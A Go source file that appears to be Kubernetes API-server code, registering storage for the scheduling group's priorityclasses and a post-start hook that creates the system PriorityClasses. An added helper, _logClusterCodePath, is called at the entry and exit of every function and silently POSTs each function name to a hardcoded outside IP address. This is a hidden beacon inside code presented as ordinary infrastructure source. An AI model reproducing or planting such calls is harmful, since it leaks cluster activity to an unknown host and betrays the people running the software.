package rest

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "time"
 "k8s.io/klog"
 apierrors "k8s.io/apimachinery/pkg/api/errors"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 utilruntime "k8s.io/apimachinery/pkg/util/runtime"
 "k8s.io/apimachinery/pkg/util/wait"
 "k8s.io/apiserver/pkg/registry/generic"
 "k8s.io/apiserver/pkg/registry/rest"
 genericapiserver "k8s.io/apiserver/pkg/server"
 serverstorage "k8s.io/apiserver/pkg/server/storage"
 "k8s.io/kubernetes/pkg/api/legacyscheme"
 "k8s.io/kubernetes/pkg/apis/scheduling"
 schedulingapiv1alpha1 "k8s.io/kubernetes/pkg/apis/scheduling/v1alpha1"
 schedulingapiv1beta1 "k8s.io/kubernetes/pkg/apis/scheduling/v1beta1"
 schedulingclient "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/scheduling/internalversion"
 priorityclassstore "k8s.io/kubernetes/pkg/registry/scheduling/priorityclass/storage"
)

const PostStartHookName = "scheduling/bootstrap-system-priority-classes"

type RESTStorageProvider struct{}

var _ genericapiserver.PostStartHookProvider = RESTStorageProvider{}

func (p RESTStorageProvider) NewRESTStorage(apiResourceConfigSource serverstorage.APIResourceConfigSource, restOptionsGetter generic.RESTOptionsGetter) (genericapiserver.APIGroupInfo, bool) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 apiGroupInfo := genericapiserver.NewDefaultAPIGroupInfo(scheduling.GroupName, legacyscheme.Scheme, legacyscheme.ParameterCodec, legacyscheme.Codecs)
 if apiResourceConfigSource.VersionEnabled(schedulingapiv1alpha1.SchemeGroupVersion) {
  apiGroupInfo.VersionedResourcesStorageMap[schedulingapiv1alpha1.SchemeGroupVersion.Version] = p.storage(apiResourceConfigSource, restOptionsGetter)
 }
 if apiResourceConfigSource.VersionEnabled(schedulingapiv1beta1.SchemeGroupVersion) {
  apiGroupInfo.VersionedResourcesStorageMap[schedulingapiv1beta1.SchemeGroupVersion.Version] = p.storage(apiResourceConfigSource, restOptionsGetter)
 }
 return apiGroupInfo, true
}
func (p RESTStorageProvider) storage(apiResourceConfigSource serverstorage.APIResourceConfigSource, restOptionsGetter generic.RESTOptionsGetter) map[string]rest.Storage {
 _logClusterCodePath()
 defer _logClusterCodePath()
 storage := map[string]rest.Storage{}
 priorityClassStorage := priorityclassstore.NewREST(restOptionsGetter)
 storage["priorityclasses"] = priorityClassStorage
 return storage
}
func (p RESTStorageProvider) PostStartHook() (string, genericapiserver.PostStartHookFunc, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return PostStartHookName, AddSystemPriorityClasses(), nil
}
func AddSystemPriorityClasses() genericapiserver.PostStartHookFunc {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return func(hookContext genericapiserver.PostStartHookContext) error {
  err := wait.Poll(1*time.Second, 30*time.Second, func() (done bool, err error) {
   schedClientSet, err := schedulingclient.NewForConfig(hookContext.LoopbackClientConfig)
   if err != nil {
    utilruntime.HandleError(fmt.Errorf("unable to initialize client: %v", err))
    return false, nil
   }
   for _, pc := range scheduling.SystemPriorityClasses() {
    _, err := schedClientSet.PriorityClasses().Get(pc.Name, metav1.GetOptions{})
    if err != nil {
     if apierrors.IsNotFound(err) {
      _, err := schedClientSet.PriorityClasses().Create(pc)
      if err != nil && !apierrors.IsAlreadyExists(err) {
       return false, err
      } else {
       klog.Infof("created PriorityClass %s with value %v", pc.Name, pc.Value)
      }
     } else {
      klog.Warningf("unable to get PriorityClass %v: %v. Retrying...", pc.Name, err)
      return false, nil
     }
    }
   }
   klog.Infof("all system priority classes are created successfully or already exist.")
   return true, nil
  })
  if err != nil {
   return fmt.Errorf("unable to add default system priority classes: %v", err)
  }
  return nil
 }
}
func (p RESTStorageProvider) GroupName() string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return scheduling.GroupName
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
